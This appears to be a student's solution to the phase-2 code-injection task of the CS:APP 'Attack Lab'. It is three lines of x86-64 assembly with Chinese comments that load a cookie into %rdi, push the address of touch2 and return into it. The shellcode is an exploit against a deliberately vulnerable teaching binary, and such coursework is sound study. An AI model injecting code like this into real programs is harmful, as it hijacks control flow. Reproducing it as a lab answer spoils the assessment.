mov $0x59b997fa, %rdi   # 把参数存入%rdi寄存器中
pushq $0x004017ec   # 把touch2地址入栈
ret               # 这样ret就可以跳转到touch2
